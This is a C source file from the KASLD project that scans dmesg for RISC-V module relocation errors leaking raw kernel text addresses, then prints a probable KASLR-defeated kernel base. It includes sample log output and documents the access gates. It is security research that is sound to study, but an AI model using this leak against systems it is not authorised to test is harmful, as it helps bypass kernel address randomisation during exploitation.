// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for RISC-V address relocation failures.
//
// From arch/riscv/kernel/module.c:
//
// "%s: target %016llx can not be addressed by the 32-bit offset from PC = %p\n"
// "%s: can not generate the GOT entry for symbol = %016llx from PC = %p\n"
//
// clang-format off
// $ dmesg | grep ffffe0
// [    0.000000]       lowmem : 0xffffffe000000000 - 0xffffffe07fe00000   (2046 MB)
// [   90.803776] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 000000007c954634
// [   91.659399] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   92.516203] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   93.452368] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 0000000022acd662
// [   97.393958] nf_tables: target ffffffe0000dbc18 can not be addressed by the 32-bit offset from PC = 00000000ca60ae01
// ...
// clang-format on
//
// # grep ffffffe0000dbc18 /proc/kallsyms
// ffffffe0000dbc18 t trace_initcall_finish_cb
// ffffffe0000dbc18 T _stext
// ffffffe0000dbc18 T _text
// ffffffe0000dbc18 D __init_end
// ffffffe0000dbc18 D __per_cpu_end
//
// Leak primitive:
//   Data leaked:      kernel text virtual address (_stext / _text)
//   Kernel subsystem: arch/riscv/kernel/module — module relocation error
//   Data structure:   relocation target address (kernel text virtual pointer)
//   Address type:     virtual (kernel text)
//   Method:           parsed (dmesg string)
//   Status:           unfixed (error message prints raw kernel pointer)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v6.7/source/arch/riscv/kernel/module.c
//
// Mitigations:
//   Access gated by dmesg_restrict (see dmesg.h for shared access gate
//   details). Only triggered when a RISC-V kernel module has a 32-bit
//   relocation that cannot reach the target. RISC-V only.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.7/source/arch/riscv/kernel/module.c
// https://github.com/riscv-non-isa/riscv-asm-manual/blob/master/riscv-asm.md#assembler-relocation-functions
// ---
// <bcoles@gmail.com>

#if !defined(__riscv) && !defined(__riscv__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Searches dmesg for RISC-V kernel module relocation error messages "
    "that print raw kernel text virtual addresses. When a 32-bit "
    "relocation overflows, the error message includes the target "
    "address (e.g., _stext), which is the KASLR-adjusted kernel text "
    "base. RISC-V only. Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

static const char *needle = ": target ";

static int on_match(const char *line, void *ctx) {
  unsigned long *lowest = ctx;
  char *endptr;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);

  if (addr && addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    if (!*lowest || addr < *lowest)
      *lowest = addr;
  }

  return 1; /* keep scanning for lowest */
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for RISC-V address relocation failures ...\n");
  int ds = dmesg_search(": target ", on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] RISC-V address relocation info not found in dmesg\n");
    return 0;
  }

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, NULL);
  return 0;
}
